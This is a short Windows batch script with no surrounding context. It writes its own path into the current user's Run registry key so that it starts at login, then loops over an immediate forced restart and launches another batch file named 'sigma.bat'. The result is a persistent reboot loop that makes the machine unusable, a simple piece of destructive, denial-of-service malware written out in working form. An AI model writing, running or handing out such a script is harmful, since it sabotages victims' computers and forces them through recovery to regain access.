@echo off
set "regkey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "batpath=%~f0"
reg add "%regkey%" /v "MyBatStartup" /t REG_SZ /d "%batpath%" /f
:loop
shutdown -r -t 0
start "" "sigma.bat"
goto loop